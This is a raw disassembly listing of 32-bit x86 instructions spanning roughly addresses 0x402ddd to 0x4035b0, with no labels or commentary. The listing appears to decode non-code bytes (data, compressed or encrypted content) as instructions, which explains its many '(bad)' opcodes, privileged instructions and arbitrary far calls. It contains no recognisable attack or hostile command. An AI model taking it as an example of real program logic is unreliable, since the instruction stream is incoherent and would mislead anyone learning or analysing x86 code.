  402ddd:	sub    al,0xa6
  402ddf:	ins    DWORD PTR es:[edi],dx
  402de0:	xor    al,0x35
  402de2:	icebp  
  402de3:	jns    0x402da1
  402de5:	mov    ecx,0xb2b78b30
  402dea:	arpl   bx,bx
  402dec:	call   0x0:0xaca2c7
  402df3:	add    BYTE PTR [eax],al
  402df5:	mov    eax,esp
  402df7:	cmc    
  402df8:	rcl    BYTE PTR ss:[ebp-0x71dcba54],0x67
  402e00:	sbb    dh,dh
  402e02:	fs push ds
  402e04:	out    0xa,eax
  402e06:	jl     0x402da0
  402e08:	icebp  
  402e09:	xor    al,0x39
  402e0b:	fldenv [edx]
  402e0d:	sub    al,0x30
  402e0f:	sbb    dl,BYTE PTR [ebx+0x41]
  402e12:	dec    ebx
  402e13:	pop    ebx
  402e14:	inc    esp
  402e15:	push   edx
  402e16:	bound  edi,QWORD PTR [esi+ebp*4-0x220aeaf5]
  402e1d:	call   0xdd06c2d
  402e22:	out    0x76,eax
  402e24:	jg     0x402e1c
  402e26:	std    
  402e27:	lahf   
  402e28:	imul   edi,DWORD PTR [esi-0x80],0xffffffe1
  402e2c:	pushf  
  402e2d:	jne    0x402e96
  402e2f:	adc    cl,cl
  402e31:	pop    eax
  402e32:	xchg   edx,eax
  402e33:	push   ebx
  402e34:	mov    edx,0x2744994b
  402e39:	sbb    ah,0xfd
  402e3c:	push   edi
  402e3d:	popa   
  402e3e:	ret    
  402e3f:	mov    dh,0x5
  402e41:	xor    al,0xae
  402e43:	outs   dx,DWORD PTR ds:[esi]
  402e44:	idiv   BYTE PTR [esi*4+0x6df1208b]
  402e4b:	retf   0xf3ef
  402e4e:	jbe    0x402e50
  402e50:	or     DWORD PTR [ebx+0x3048a790],ecx
  402e56:	cdq    
  402e57:	mov    esi,0x4f
  402e5c:	add    BYTE PTR [eax],al
  402e5e:	(bad)  
  402e5f:	(bad)  
  402e61:	xchg   cl,ch
  402e63:	iret   
  402e64:	call   0xc3e52436
  402e69:	add    al,0x7
  402e6b:	mov    esi,0x260353da
  402e70:	pop    ebp
  402e71:	xchg   edx,eax
  402e72:	sbb    BYTE PTR [esp+eax*2],bh
  402e75:	rol    edx,0x57
  402e78:	outs   dx,DWORD PTR ds:[esi]
  402e79:	add    BYTE PTR [edx+0x1c977652],bh
  402e7f:	adc    DWORD PTR [ecx],edi
  402e81:	dec    esi
  402e82:	lahf   
  402e83:	sbb    BYTE PTR [eax],ah
  402e85:	add    eax,0xbc0afc6e
  402e8a:	outs   dx,BYTE PTR ds:[esi]
  402e8b:	out    0x11,al
  402e8d:	cmp    ch,BYTE PTR [ebx+0x3c]
  402e90:	fistp  QWORD PTR [ebx+0x50]
  402e93:	es (bad) 
  402e95:	mov    eax,0xf9ed529a
  402e9a:	mov    ds:0x241ef457,eax
  402e9f:	sbb    BYTE PTR [ebx-0x5deec8a9],bh
  402ea5:	pushf  
  402ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ea7:	out    0x88,al
  402ea9:	aad    0xd6
  402eab:	cli    
  402eac:	pop    DWORD PTR [edx]
  402eae:	in     eax,dx
  402eaf:	bound  edx,QWORD PTR [edi]
  402eb1:	inc    ebx
  402eb2:	mov    bh,BYTE PTR [esi+0xe]
  402eb5:	jo     0x402e87
  402eb7:	cwde   
  402eb8:	and    eax,0x3c9029b1
  402ebd:	out    0xaf,al
  402ebf:	iret   
  402ec0:	jae    0x402e61
  402ec2:	add    BYTE PTR [eax],al
  402ec4:	add    BYTE PTR [eax],al
  402ec6:	add    BYTE PTR [esi-0x23ab9526],ch
  402ecc:	mov    ebp,0xa47f0d41
  402ed1:	pop    eax
  402ed2:	add    cl,cl
  402ed4:	or     eax,0x3c98f079
  402ed9:	(bad)  
  402eda:	jmp    0xc28f1b3a
  402edf:	sbb    bl,bl
  402ee1:	push   ebx
  402ee2:	fcmovne st,st(5)
  402ee4:	dec    eax
  402ee5:	adc    eax,0xe795c94
  402eea:	lea    ebx,[edi]
  402eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402eed:	and    esp,DWORD PTR [esi-0x40c76832]
  402ef3:	mov    eax,ds:0x6038a083
  402ef8:	mov    dl,0xbb
  402efa:	and    DWORD PTR [ebx],edx
  402efc:	xchg   si,ax
  402efe:	or     ah,dl
  402f00:	push   esp
  402f01:	lea    edx,[ebx]
  402f03:	test   esi,edi
  402f05:	retf   
  402f06:	pop    esp
  402f07:	and    al,0x15
  402f09:	xlat   BYTE PTR ds:[ebx]
  402f0a:	inc    ebp
  402f0b:	xlat   BYTE PTR ds:[ebx]
  402f0c:	and    edi,edx
  402f0e:	outs   dx,BYTE PTR ds:[esi]
  402f0f:	xchg   esi,eax
  402f10:	repnz loopne 0x402f8a
  402f13:	clc    
  402f14:	call   0x5a69e9d3
  402f19:	mov    al,ds:0x8d066aa3
  402f1e:	mov    BYTE PTR [ebx-0x36e6a49],ch
  402f24:	sub    eax,0x9d2dded7
  402f29:	int3   
  402f2a:	mov    DWORD PTR [eax],0x0
  402f30:	outs   dx,BYTE PTR ds:[esi]
  402f31:	retf   
  402f32:	loope  0x402f20
  402f34:	lahf   
  402f35:	jp     0x402f31
  402f37:	cmc    
  402f38:	shr    BYTE PTR [esi+0x62],1
  402f3b:	jb     0x402f6e
  402f3d:	loopne 0x402fb8
  402f3f:	imul   esp,DWORD PTR [edx-0x70],0x54
  402f43:	inc    eax
  402f44:	mov    bl,0x41
  402f46:	dec    edi
  402f47:	pop    ecx
  402f48:	mov    ah,0x18
  402f4a:	push   cs
  402f4b:	push   ss
  402f4c:	jne    0x402ef7
  402f4e:	adc    al,0xf
  402f50:	jne    0x402fc7
  402f52:	xor    al,0x38
  402f54:	cdq    
  402f55:	xor    al,0x45
  402f57:	and    ebx,DWORD PTR [eax+0x58fd2f90]
  402f5d:	leave  
  402f5e:	pop    esi
  402f5f:	out    0x49,al
  402f61:	push   cs
  402f62:	or     eax,0xfc472acb
  402f67:	iret   
  402f68:	sub    ecx,DWORD PTR [edx+esi*2-0x6f]
  402f6c:	je     0x402efb
  402f6e:	mov    ds:0xcfca8d8a,eax
  402f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f74:	or     ax,cx
  402f77:	mov    esp,0x24a5584f
  402f7c:	loopne 0x402f0f
  402f7e:	aam    0x3f
  402f80:	rol    esi,0x86
  402f83:	adc    ah,dl
  402f85:	mov    edi,0x94f30975
  402f8a:	call   0x19956bd6
  402f8f:	push   ebx
  402f90:	inc    ebp
  402f91:	add    cl,BYTE PTR [edx+0x7e]
  402f94:	add    BYTE PTR [eax],al
  402f96:	add    BYTE PTR [eax],al
  402f98:	add    BYTE PTR [esi-0x3d],bl
  402f9b:	cmp    ah,BYTE PTR [ebp+0x57]
  402f9e:	add    DWORD PTR ds:0x4c38a23f,edi
  402fa4:	and    al,0x83
  402fa6:	jg     0x402fc6
  402fa8:	or     DWORD PTR [eax-0x4a],esp
  402fab:	in     eax,dx
  402fac:	adc    DWORD PTR [ecx+0x1d],esi
  402faf:	adc    BYTE PTR [ebx-0x42],0x5c
  402fb3:	xchg   ecx,eax
  402fb4:	dec    eax
  402fb5:	(bad)  
  402fb6:	fwait
  402fb7:	loope  0x40301e
  402fb9:	pushf  
  402fba:	fidiv  DWORD PTR [edx-0x48f66a82]
  402fc0:	out    0x1a,al
  402fc2:	add    dh,al
  402fc4:	std    
  402fc5:	or     esi,DWORD PTR [edi]
  402fc7:	xchg   esp,eax
  402fc8:	shr    BYTE PTR [eax],1
  402fca:	outs   dx,BYTE PTR ds:[esi]
  402fcb:	arpl   bx,cx
  402fcd:	sub    DWORD PTR [edx],eax
  402fcf:	jecxz  0x402fca
  402fd1:	cld    
  402fd2:	test   BYTE PTR [edx+0x519c040a],ah
  402fd8:	pop    eax
  402fd9:	and    DWORD PTR [ebx+0x10],esi
  402fdc:	sub    DWORD PTR [edx],edx
  402fde:	push   0x32
  402fe0:	pushf  
  402fe1:	idiv   ah
  402fe3:	repnz ins BYTE PTR es:[edi],dx
  402fe5:	in     eax,dx
  402fe6:	jecxz  0x402f87
  402fe8:	mov    ebp,0xce610b08
  402fed:	or     edx,DWORD PTR [edx]
  402fef:	ss popa 
  402ff1:	mov    ds:0xa12fef60,al
  402ff6:	inc    edi
  402ff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ff8:	add    bh,BYTE PTR [esi+ebp*1+0x115d]
  402fff:	add    BYTE PTR [eax],al
  403001:	add    BYTE PTR [edi+0x2f162a35],dh
  403007:	mov    ch,0xeb
  403009:	out    0x35,al
  40300b:	lods   al,BYTE PTR ds:[esi]
  40300c:	test   al,0x33
  40300e:	adc    ebx,eax
  403010:	imul   eax,DWORD PTR [edx+eax*1-0x26],0x97abdaae
  403018:	out    0xa9,eax
  40301a:	cwde   
  40301b:	nop
  40301c:	sub    al,0x78
  40301e:	jne    0x403085
  403020:	xchg   DWORD PTR gs:[esi+0x7e],edi
  403024:	jecxz  0x402fb3
  403026:	mov    ah,0x31
  403028:	mov    ds:0x512aaf7e,al
  40302d:	stos   DWORD PTR es:[edi],eax
  40302e:	retf   0x1043
  403031:	fmul   st(1),st
  403033:	pop    esp
  403034:	pop    es
  403035:	push   ebx
  403036:	pusha  
  403037:	adc    eax,0xe6341be
  40303c:	jne    0x40302e
  40303e:	jg     0x403027
  403040:	sub    ebx,DWORD PTR [edi]
  403042:	jne    0x403044
  403044:	fild   DWORD PTR [ebx]
  403046:	in     eax,dx
  403047:	jns    0x402fe3
  403049:	hlt    
  40304a:	mul    DWORD PTR [edx+0x0]
  40304d:	pop    ecx
  40304e:	pop    eax
  40304f:	jo     0x402fdc
  403051:	sbb    BYTE PTR [ebx-0x44006d8b],ah
  403057:	mov    dh,0xdd
  403059:	ss sub eax,0x4c7dc4b0
  40305f:	(bad)  
  403060:	out    dx,eax
  403061:	mov    ah,0xff
  403063:	fdecstp 
  403065:	rol    BYTE PTR [eax],1
  403067:	add    BYTE PTR [eax],al
  403069:	add    BYTE PTR [eax],al
  40306b:	cmc    
  40306c:	pop    es
  40306d:	scas   al,BYTE PTR es:[edi]
  40306e:	xchg   ecx,eax
  40306f:	cli    
  403070:	push   ds
  403071:	mov    bh,0x42
  403073:	xlat   BYTE PTR ds:[ebx]
  403074:	icebp  
  403075:	fwait
  403076:	add    eax,DWORD PTR [ebp*8+0x2b6e9484]
  40307d:	retf   0x394d
  403080:	xor    dl,bl
  403082:	push   es
  403083:	sbb    BYTE PTR [ebp-0x8],0xbf
  403087:	mov    BYTE PTR [ebp-0x1f],al
  40308a:	mov    BYTE PTR [edi+0x7c4966dd],cl
  403090:	lds    edi,FWORD PTR [edi+0xa]
  403093:	sbb    eax,0x53cb54aa
  403098:	mov    bl,0x4d
  40309a:	dec    esp
  40309b:	sub    BYTE PTR [edx+eax*1-0x7b],dh
  40309f:	xor    ebp,DWORD PTR [ecx+0x1b]
  4030a2:	into   
  4030a3:	pop    es
  4030a4:	xchg   BYTE PTR [eax],dh
  4030a6:	pop    es
  4030a7:	rcr    DWORD PTR [edi-0x3a387ed7],1
  4030ad:	in     al,0x40
  4030af:	adc    al,0xe0
  4030b1:	std    
  4030b2:	repz xor dh,BYTE PTR [ebx-0x56044d2a]
  4030b9:	iret   
  4030ba:	gs pusha 
  4030bc:	imul   eax,DWORD PTR [eax-0x668b34e4],0xb29f6fd7
  4030c6:	mov    ds,WORD PTR [esi]
  4030c8:	sub    DWORD PTR [ebx+0x1baa4c00],0x2c
  4030cf:	add    BYTE PTR [eax],al
  4030d1:	add    BYTE PTR [eax],al
  4030d3:	add    BYTE PTR ds:0xbe350718,cl
  4030d9:	dec    eax
  4030da:	sub    bl,BYTE PTR [esi]
  4030dc:	jg     0x4030d8
  4030de:	xor    BYTE PTR [edi],al
  4030e0:	adc    BYTE PTR [eax+esi*2+0x48],ah
  4030e4:	rcl    edx,0x6b
  4030e7:	push   ecx
  4030e8:	add    BYTE PTR [ebp+0x38437a46],0x5d
  4030ef:	arpl   WORD PTR [edx-0x24340527],cx
  4030f5:	push   0x3818d2e1
  4030fa:	int3   
  4030fb:	stc    
  4030fc:	sbb    DWORD PTR [edi+0x1866e0d7],eax
  403102:	xchg   esi,eax
  403103:	scas   eax,DWORD PTR es:[edi]
  403104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403106:	mov    WORD PTR [esi-0x62600d2c],?
  40310c:	adc    eax,0x6284bb44
  403111:	pop    edi
  403112:	and    eax,DWORD PTR [ebx]
  403114:	xchg   ebx,eax
  403115:	out    dx,al
  403116:	aaa    
  403117:	sbb    dl,al
  403119:	add    DWORD PTR ds:0xe111131,edx
  40311f:	sub    BYTE PTR [esi],bl
  403121:	call   0x7e54:0x295f674f
  403128:	mov    WORD PTR [edi+0x79],?
  40312b:	push   ebp
  40312c:	int    0xce
  40312e:	bound  ecx,QWORD PTR [ebx+ebx*2-0x3b]
  403132:	cmp    BYTE PTR [ecx-0x67dc8a16],al
  403138:	add    BYTE PTR [eax],al
  40313a:	add    BYTE PTR [eax],al
  40313c:	add    BYTE PTR [ecx+0x68b30e2a],ch
  403142:	fwait
  403143:	adc    eax,0x540677aa
  403148:	in     eax,0x36
  40314a:	mov    cl,0x4e
  40314c:	cld    
  40314d:	jne    0x403181
  40314f:	and    eax,0x53f44262
  403154:	jns    0x403199
  403156:	fst    QWORD PTR [eax-0x1f]
  403159:	mov    esp,0xa5fa4195
  40315e:	pop    esi
  40315f:	out    dx,al
  403160:	(bad)  
  403161:	jle    0x40317a
  403163:	pop    ds
  403164:	int3   
  403165:	push   edi
  403166:	mov    eax,0xf9988d89
  40316b:	jp     0x403103
  40316d:	test   eax,0x7abbac3a
  403172:	jnp    0x403151
  403174:	mov    al,ds:0x7eb3d77b
  403179:	sub    ecx,DWORD PTR [esi+0x453a65c2]
  40317f:	xchg   ebp,eax
  403180:	dec    eax
  403181:	dec    ecx
  403182:	mov    esp,0x93285363
  403187:	not    BYTE PTR [ecx]
  403189:	outs   dx,DWORD PTR ds:[esi]
  40318a:	push   edx
  40318b:	pop    es
  40318c:	or     DWORD PTR [esi+0x1],edx
  40318f:	pop    eax
  403190:	and    al,0x6d
  403192:	shr    BYTE PTR [eax],0x3f
  403195:	fs (bad) 
  403197:	cmp    eax,0x4c46e3a7
  40319c:	mov    esp,0x911b0df2
  4031a1:	add    BYTE PTR [eax],al
  4031a3:	add    BYTE PTR [eax],al
  4031a5:	add    cl,dl
  4031a7:	(bad)  
  4031a8:	jmp    0x808b6236
  4031ad:	retf   
  4031ae:	mov    dl,BYTE PTR [bx+di+0x4ed0]
  4031b3:	leave  
  4031b4:	(bad)  
  4031b6:	xor    eax,0x2ce6af08
  4031bb:	xchg   BYTE PTR [ebp-0x2c009e44],ah
  4031c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031c2:	jo     0x403178
  4031c4:	or     BYTE PTR [edx-0x6e8e926d],0x72
  4031cb:	add    ah,BYTE PTR [eax-0x18]
  4031ce:	cmp    dh,BYTE PTR [edx]
  4031d0:	and    DWORD PTR [ecx],ebx
  4031d2:	cs sub edx,edx
  4031d5:	inc    ebp
  4031d6:	adc    eax,DWORD PTR [eax-0x6d]
  4031d9:	adc    BYTE PTR ss:[ecx+0x3c],bl
  4031dd:	sub    edx,DWORD PTR [eax-0x7ca60a22]
  4031e3:	(bad)  
  4031e4:	mov    esi,0x77aca60c
  4031e9:	sti    
  4031ea:	cmp    dh,BYTE PTR [ebp+0x7a7c6d98]
  4031f0:	fstp   DWORD PTR [esi-0x2fe59c79]
  4031f6:	call   0xe991:0x99c15b88
  4031fd:	add    esi,DWORD PTR [ebp+0x2]
  403200:	imul   BYTE PTR [ecx]
  403202:	mov    bh,0x2
  403204:	inc    edi
  403205:	fdiv   st,st(1)
  403207:	add    BYTE PTR [eax],dl
  403209:	jle    0x40320b
  40320b:	add    BYTE PTR [eax],al
  40320d:	add    BYTE PTR [eax],al
  40320f:	cmp    eax,DWORD PTR [eax]
  403211:	lds    ebp,FWORD PTR [ebx+0x7c]
  403214:	add    eax,0x3aec192
  403219:	pop    ebx
  40321a:	aas    
  40321b:	call   0x42559625
  403220:	pop    es
  403221:	inc    ecx
  403222:	push   esp
  403223:	data16 or al,0x6e
  403226:	cli    
  403227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403228:	or     al,0x9f
  40322a:	mov    dl,ah
  40322c:	push   cs
  40322d:	mov    BYTE PTR [esi-0x4332f138],ch
  403233:	vprotd xmm15,xmm0,ds:0xf8f0e30b
  40323c:	or     BYTE PTR [edi+eax*2],cl
  40323f:	mov    cl,0x7
  403241:	mov    ecx,0xa61e9362
  403246:	int3   
  403247:	pop    ecx
  403248:	push   ds
  403249:	add    bh,dl
  40324b:	and    DWORD PTR [eax+0x1f],0x0
  40324f:	push   esp
  403250:	and    bl,BYTE PTR [esi]
  403252:	push   ebp
  403253:	jg     0x403240
  403255:	sbb    al,BYTE PTR [edx+0x2b1aad59]
  40325b:	cmp    ebp,DWORD PTR [eax+0x18]
  40325e:	adc    al,0x8d
  403260:	sub    DWORD PTR [ecx],ebx
  403262:	xor    esp,eax
  403264:	cmc    
  403265:	adc    esi,edi
  403267:	fbstp  TBYTE PTR [ebx+0x73104f13]
  40326d:	adc    DWORD PTR [eax+0x42],ebx
  403270:	das    
  403271:	adc    ch,bh
  403273:	add    BYTE PTR [eax],al
  403275:	add    BYTE PTR [eax],al
  403277:	add    BYTE PTR [esi+edi*8+0x14],cl
  40327b:	or     ch,cl
  40327d:	mov    ebp,0x7aeb5314
  403282:	push   ss
  403283:	sbb    al,0x1d
  403285:	cmp    DWORD PTR [edi],edx
  403287:	leave  
  403288:	xor    ecx,DWORD PTR [ebp+0x38]
  40328b:	xchg   esi,eax
  40328c:	lds    ecx,FWORD PTR [ecx+edi*1+0x3bc9e767]
  403293:	jo     0x403286
  403295:	pop    es
  403296:	cmp    ah,ch
  403298:	fadd   DWORD PTR [esi+0x3f]
  40329b:	repnz cli 
  40329d:	test   BYTE PTR [esi],bh
  40329f:	cmp    ebx,DWORD PTR [edi+0x29043c7b]
  4032a5:	add    BYTE PTR ds:0x365c6021,bh
  4032ab:	push   cs
  4032ac:	inc    edx
  4032ad:	sahf   
  4032ae:	aaa    
  4032af:	mov    edi,0xe835d8b5
  4032b4:	fistp  WORD PTR [edx]
  4032b6:	xor    al,0x6d
  4032b8:	call   0x4ada6410
  4032bd:	xchg   ebp,eax
  4032be:	xor    BYTE PTR [ebx-0x74],al
  4032c1:	iret   
  4032c2:	xor    ch,BYTE PTR [esi+esi*2]
  4032c5:	adc    DWORD PTR [ebx],esi
  4032c7:	add    BYTE PTR [ebx+eiz*2-0x7304db95],ch
  4032ce:	test   eax,0xeeaf8225
  4032d3:	daa    
  4032d4:	push   ebp
  4032d5:	pop    ecx
  4032d6:	sub    eax,0x624be026
  4032db:	and    eax,DWORD PTR [eax]
  4032dd:	add    BYTE PTR [eax],al
  4032df:	add    BYTE PTR [eax],al
  4032e1:	xlat   BYTE PTR ds:[ebx]
  4032e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032e3:	lahf   
  4032e4:	and    ch,BYTE PTR [esi]
  4032e6:	cwde   
  4032e7:	out    0x20,al
  4032e9:	or     DWORD PTR [edx+0x24],esi
  4032ec:	and    DWORD PTR [ebx+esi*1],esp
  4032ef:	js     0x40331b
  4032f1:	and    ebx,ebp
  4032f3:	mov    edx,0xfbdeca2b
  4032f8:	sub    DWORD PTR [ebp+0x9],ebp
  4032fb:	ds sub al,cl
  4032fe:	sbb    dh,BYTE PTR [ecx+0x2d]
  403301:	pmaddwd mm6,QWORD PTR [edx-0xa3899d4]
  403308:	cs push ecx
  40330a:	and    DWORD PTR [edi],esi
  40330c:	das    
  40330d:	sbb    al,0x8c
  40330f:	call   0xf271:0x58660b70
  403316:	push   edi
  403317:	push   ds
  403318:	jae    0x40335f
  40331a:	mov    dl,0xdb
  40331c:	jb     0x40338e
  40331e:	mov    ds:0x4dc77792,eax
  403323:	push   ecx
  403324:	jbe    0x4033a4
  403326:	outs   dx,DWORD PTR ds:[esi]
  403327:	pop    ss
  403328:	je     0x403383
  40332a:	cdq    
  40332b:	aad    0x75
  40332d:	je     0x4032d1
  40332f:	mov    DWORD PTR [esi+0x53],edi
  403332:	xor    al,0x4b
  403334:	jg     0x4032d0
  403336:	push   es
  403337:	or     eax,0xcee43d7d
  40333c:	jl     0x403336
  40333e:	icebp  
  40333f:	jg     0x4033ba
  403341:	fist   WORD PTR [edi]
  403343:	inc    edx
  403344:	js     0x403346
  403346:	add    BYTE PTR [eax],al
  403348:	add    BYTE PTR [eax],al
  40334a:	jne    0x403331
  40334c:	bound  eax,QWORD PTR [edi+ecx*8]
  40334f:	inc    esi
  403350:	leave  
  403351:	(bad)  
  403352:	into   
  403353:	cmp    ebp,ebp
  403355:	mov    ebx,0x7e4720d1
  40335a:	enter  0xb911,0x38
  40335e:	mov    ds:0x9bfa9342,al
  403363:	pop    DWORD PTR [ebp-0x503b714b]
  403369:	ja     0x4032fa
  40336b:	lods   eax,DWORD PTR ds:[esi]
  40336c:	push   ecx
  40336d:	xor    DWORD PTR [ebp-0x630d0432],ebx
  403373:	mov    bl,0x3c
  403375:	scas   eax,DWORD PTR es:[edi]
  403376:	xchg   edi,eax
  403377:	js     0x40338f
  403379:	ins    DWORD PTR es:[edi],dx
  40337a:	xchg   esi,eax
  40337b:	mov    DWORD PTR [eax+0x2b],ebp
  40337e:	push   esp
  40337f:	call   0xa6d3:0x7755e9c2
  403386:	pop    eax
  403387:	int3   
  403388:	jns    0x4033ee
  40338a:	push   ecx
  40338b:	xchg   ebp,eax
  40338c:	pop    es
  40338d:	and    bl,BYTE PTR [ebx+0x56]
  403390:	sub    eax,0xcf0b52e0
  403395:	xlat   BYTE PTR ds:[ebx]
  403396:	sub    eax,0x2c1564d0
  40339b:	loope  0x4033b7
  40339d:	push   ebx
  40339e:	repnz xor BYTE PTR ds:[ecx-0x21d8a0c1],dl
  4033a6:	xor    dh,BYTE PTR [ebp+ecx*1+0x1c]
  4033aa:	sub    edi,DWORD PTR ds:0x5a73
  4033b0:	add    BYTE PTR [eax],al
  4033b2:	add    BYTE PTR [ecx+0x3e],al
  4033b5:	fstp   DWORD PTR [eax-0x3b61dcc8]
  4033bb:	cmp    ecx,DWORD PTR [eax-0x4c]
  4033be:	push   es
  4033bf:	xor    bh,BYTE PTR [ecx]
  4033c1:	dec    edx
  4033c2:	inc    eax
  4033c3:	mov    eax,0xb181e06a
  4033c8:	add    ch,BYTE PTR [ebp-0x25bcce0b]
  4033ce:	pop    ebx
  4033cf:	push   0x42
  4033d1:	add    esp,DWORD PTR [edx-0x7813bb44]
  4033d7:	inc    BYTE PTR [ecx+ebx*4+0x2b]
  4033db:	inc    esp
  4033dc:	dec    esi
  4033dd:	mov    BYTE PTR ds:0x77f74f86,0xa8
  4033e4:	push   ecx
  4033e5:	loopne 0x4033b8
  4033e7:	loop   0x403438
  4033e9:	jne    0x4033af
  4033eb:	sbb    eax,0x5f6e6255
  4033f0:	push   esp
  4033f1:	or     edx,DWORD PTR [eax]
  4033f3:	xchg   ecx,eax
  4033f4:	push   edx
  4033f5:	xor    al,0x3a
  4033f7:	retf   
  4033f8:	push   edx
  4033f9:	adc    ebp,edi
  4033fb:	adc    al,0x5c
  4033fd:	push   ds
  4033fe:	push   edi
  4033ff:	push   ebp
  403400:	pop    ebp
  403401:	outs   dx,DWORD PTR ds:[esi]
  403402:	test   eax,0x83385b5b
  403407:	adc    DWORD PTR [edx+0x1d],ebx
  40340a:	xchg   ebp,eax
  40340b:	into   
  40340c:	push   esi
  40340d:	jmp    0x6241:0x33568cbe
  403414:	pop    eax
  403415:	cmp    al,0xeb
  403417:	add    BYTE PTR [eax],al
  403419:	add    BYTE PTR [eax],al
  40341b:	add    BYTE PTR [ecx],bl
  40341d:	pop    ecx
  40341e:	imul   ebx,DWORD PTR [esi],0x3476a388
  403424:	ret    0xc7a1
  403427:	retf   0xa3e4
  40342a:	nop
  40342b:	pusha  
  40342c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40342e:	inc    ebp
  40342f:	ja     0x403492
  403431:	mov    al,ds:0xa09bdd12
  403436:	(bad)  [edx]
  403438:	int    0x9e
  40343a:	in     al,0x8
  40343c:	setle  cl
  40343f:	dec    ebp
  403440:	pop    ebx
  403441:	test   eax,0xa796e3ee
  403446:	add    BYTE PTR [edi],bl
  403448:	pcmpgtw mm5,mm4
  40344b:	or     BYTE PTR ds:0x184ded23,ah
  403451:	call   0xa62e6f3d
  403456:	jmp    0xebad78be
  40345b:	mov    WORD PTR [edx-0x41c615d7],fs
  403461:	adc    edi,ebp
  403463:	es and dl,dl
  403466:	cld    
  403467:	push   edi
  403468:	pop    edx
  403469:	(bad)  
  40346a:	inc    BYTE PTR [eax-0x2a00b28c]
  403470:	xchg   BYTE PTR [edx+edi*8],bl
  403473:	add    bl,BYTE PTR [ebx-0x26]
  403476:	sti    
  403477:	stos   DWORD PTR es:[edi],eax
  403478:	rcr    BYTE PTR [eax+0x569c94f9],cl
  40347e:	clc    
  40347f:	mov    cl,0x0
  403481:	add    BYTE PTR [eax],al
  403483:	add    BYTE PTR [eax],al
  403485:	rol    DWORD PTR [edx],1
  403487:	repz jle 0x40347d
  40348a:	(bad)  
  40348b:	repnz iret 
  40348d:	in     eax,dx
  40348e:	xor    eax,0xffffffd8
  403491:	inc    edi
  403492:	inc    eax
  403493:	icebp  
  403494:	jge    0x4034cc
  403496:	or     esp,esi
  403498:	mov    cl,al
  40349a:	int3   
  40349b:	cmc    
  40349c:	rol    DWORD PTR [edx],cl
  40349e:	xchg   bh,dh
  4034a0:	pushf  
  4034a1:	or     al,0x48
  4034a3:	test   BYTE PTR [ecx+0x2a],0x3a
  4034a7:	fst    DWORD PTR [esi]
  4034a9:	les    edi,FWORD PTR [ecx-0x28]
  4034ac:	out    0xff,eax
  4034ae:	mov    dh,0xda
  4034b0:	lock sar eax,1
  4034b3:	fisub  DWORD PTR [ebp-0x2e]
  4034b6:	xor    esi,ebx
  4034b8:	jb     0x4034b6
  4034ba:	jae    0x40349b
  4034bc:	mov    ebx,0x84ddae96
  4034c1:	cmp    bh,ch
  4034c3:	fild   DWORD PTR [eax]
  4034c5:	aam    0xa
  4034c7:	imul   edx,edi,0xffffffeb
  4034ca:	in     al,0xa8
  4034cc:	(bad)  
  4034cd:	mov    dl,0xd6
  4034cf:	out    dx,eax
  4034d0:	aam    0xdd
  4034d2:	xor    BYTE PTR ds:0x625750d5,ch
  4034d8:	sar    BYTE PTR [edi-0x34],1
  4034db:	mov    al,ds:0xe5f336d1
  4034e0:	rcr    DWORD PTR [ecx],cl
  4034e2:	adc    eax,0x791cd224
  4034e7:	pop    esi
  4034e8:	lds    eax,FWORD PTR [eax]
  4034ea:	add    BYTE PTR [eax],al
  4034ec:	add    BYTE PTR [eax],al
  4034ee:	jae    0x403482
  4034f0:	pushf  
  4034f1:	(bad)  
  4034f2:	jmp    0x1842:0xd5c6d9a4
  4034f9:	(bad)  
  4034fa:	push   0x57c25754
  4034ff:	mov    edx,0x80bec394
  403504:	rol    ecx,cl
  403506:	and    DWORD PTR [esi+0x11],0x4d29a4c0
  40350d:	retf   
  40350e:	fwait
  40350f:	ja     0x4034a0
  403511:	retf   0xf5a2
  403514:	enter  0xedc8,0x13
  403518:	or     ecx,ecx
  40351a:	inc    eax
  40351b:	add    DWORD PTR [esp+ecx*8-0x71],eax
  40351f:	fild   WORD PTR [ebp-0x3f323933]
  403525:	iret   
  403526:	leave  
  403527:	cmp    eax,DWORD PTR [edx]
  403529:	into   
  40352a:	mov    WORD PTR [edi+ebp*4+0x6d7a8391],ss
  403531:	nop
  403532:	jp     0x403574
  403534:	sub    edx,DWORD PTR [edx-0x6c17553b]
  40353a:	clc    
  40353b:	mov    eax,0x474796a5
  403540:	fs xchg edi,eax
  403542:	jne    0x4034df
  403544:	lods   eax,DWORD PTR ds:[esi]
  403545:	and    ah,al
  403547:	pop    ebp
  403548:	and    eax,0xffffffe9
  40354b:	add    al,0xbc
  40354e:	fisub  DWORD PTR [edi+0x66]
  403551:	jle    0x403553
  403553:	add    BYTE PTR [eax],al
  403555:	add    BYTE PTR [eax],al
  403557:	adc    edx,DWORD PTR [esi+0x14]
  40355a:	cmp    BYTE PTR [ecx],cl
  40355c:	dec    ebx
  40355d:	cmp    bh,dl
  40355f:	add    BYTE PTR [eax],cl
  403561:	sub    DWORD PTR [ebp+0x76feb8fd],esi
  403567:	in     al,dx
  403568:	popa   
  403569:	jl     0x40359c
  40356b:	out    dx,al
  40356c:	(bad)  
  40356d:	shl    bl,cl
  40356f:	fistp  QWORD PTR [ebx-0x63177712]
  403575:	pop    eax
  403576:	dec    ebx
  403577:	add    DWORD PTR [esi-0x3d04f25e],ecx
  40357d:	mov    edi,cs
  40357f:	repnz setbe BYTE PTR [eax+0x42b040ef]
  403587:	(bad)  
  403588:	sub    DWORD PTR [edx+0x4],ecx
  40358b:	cld    
  40358c:	dec    esi
  40358d:	in     al,0xc5
  40358f:	in     eax,dx
  403590:	xor    ebx,DWORD PTR [edi]
  403592:	call   0x5f7:0x5808f4f6
  403599:	jae    0x4035b9
  40359b:	cmc    
  40359c:	sbb    bl,ch
  40359e:	fdivr  st(4),st
  4035a0:	test   edi,0x5e48f193
  4035a6:	push   ecx
  4035a7:	clc    
  4035a8:	adc    DWORD PTR [edi+edx*1],ebx
  4035ab:	repnz (bad) 
  4035ad:	xor    ebp,edx
  4035af:	sti    
  4035b0:	mov    edx,esp
